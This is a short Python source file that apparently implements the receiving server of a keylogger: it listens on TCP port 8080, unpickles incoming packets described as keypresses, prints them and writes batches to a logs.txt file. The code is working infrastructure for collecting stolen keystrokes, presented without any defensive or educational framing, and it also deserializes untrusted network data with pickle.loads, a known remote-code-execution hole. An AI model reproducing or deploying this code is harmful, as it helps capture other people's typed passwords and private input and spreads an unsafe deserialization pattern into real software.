import socket
import time
import pickle


class Server:
    def __init__(self):
        self.IP = socket.AF_INET
        self.serversocket = socket.socket(
            socket.AF_INET, socket.SOCK_STREAM)
        self.host = socket.gethostname()
        self.port = 8080
        self.received = []

    def bind(self):
        self.serversocket.bind((self.host, self.port))

    def log_keypress(self):
        f = open('logs.txt', 'a')
        for i in self.received:
            f.write(i + ' ')
        f.write('\n')
        f.close()

    def check_packets(self):
        if len(self.received) > 5:
            self.log_keypress()
            self.received = []

    def receive_keypress(self, sock):
        packet = pickle.loads(sock.recv(1024)).strip()
        print(packet)
        self.received.append(packet)
        self.check_packets()







server = Server()
server.bind()

server.serversocket.listen(100)

while True:
    clientsocket, addr = server.serversocket.accept()
    print('Got a connection from {}'.format(addr))
    while clientsocket:
        server.receive_keypress(clientsocket)
